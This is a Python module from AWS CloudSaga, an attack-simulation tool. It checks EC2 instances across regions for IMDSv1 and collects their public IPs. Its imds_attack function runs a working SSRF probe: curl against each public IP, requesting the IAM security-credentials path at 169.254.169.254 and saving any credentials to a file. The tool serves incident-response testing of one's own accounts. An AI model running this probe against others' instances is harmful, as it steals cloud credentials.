#// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#// SPDX-License-Identifier: Apache-2.0
# AWS CloudSaga - Simulate attacks in AWS
# Joshua "DozerCat" McKiddy - Customer Incident Response Team (CIRT) - AWS
# IMDSReveal - Check IMDS version for AWS EC2 instances


import logging
import os
import boto3
import datetime
from botocore.exceptions import ClientError
from datetime import timezone


current_date = datetime.datetime.now(tz=timezone.utc)
current_date_string = str(current_date)
timestamp_date = datetime.datetime.now(tz=timezone.utc).strftime("%Y-%m-%d-%H%M%S")
timestamp_date_string = str(timestamp_date)


imdsv1_list: list = []
public_ip_list: list = []


region_list = ['af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1', 'eu-south-1', 'me-south-1', 'sa-east-1', 'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2']


def metadata_gather():
    """Function to gather EC2 metadata status for all regions"""
    for aws_region in region_list:
        logging.info("--Checking instances in AWS region {region}--".format(region=aws_region))
        try:
            logging.info("DescribeInstances API Call in AWS region {region}--".format(region=aws_region))
            ec2 = boto3.client('ec2', region_name=aws_region)
            metadata_v1 = ec2.describe_instances()
            for instances in metadata_v1['Reservations']:
                for version in instances['Instances']:
                    if version['MetadataOptions']['HttpTokens'] == 'optional':
                        instance_id = version['InstanceId']
                        logging.info("Instance ID {id} is using IMDSv1, where no authentication header is required to access the IMDS service.".format(id=instance_id))
                        if 'PublicIpAddress' in version:
                            public_ip = version['PublicIpAddress']
                            logging.info("Instance ID {id} has a public IP address of {ip}.".format(id=instance_id, ip=public_ip))
                            public_ip_list.append(public_ip)
                        print(" ")
                    elif version['MetadataOptions']['HttpTokens'] == 'required':
                        instance_id = version['InstanceId']
                        logging.info("Instance ID {id}is using IMDSv2, which requires authentication headers for accessing the IMDS service.".format(id=instance_id))
                        print(" ")
        except Exception as exception_handle:
            logging.info("You cannot perform lookup of IMDS versions in this region. Error message below:")
            logging.error(exception_handle)


def imds_attack():
    """Function to run attack on instances running IMDSv1"""
    os.system("touch credentials.txt")
    for ip in public_ip_list:
        logging.info("Performing SSRF Probe of {ip}".format(ip=ip))
        logging.info("")
        os.system("curl http://{ip}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ >> credentials.txt".format(ip=ip))
        os.system("echo  ' ' >>  credentials.txt")
    logging.info("If any credentials are found, they'll be listed below here:")
    os.system("cat credentials.txt")


def main():
    """Main function to run the IMDS reveal code"""
    logging.info("Output of logs can be found in cloudsaga_imds_reveal.log")
    metadata_gather()
    imds_attack()


if __name__ == '__main__':
   main()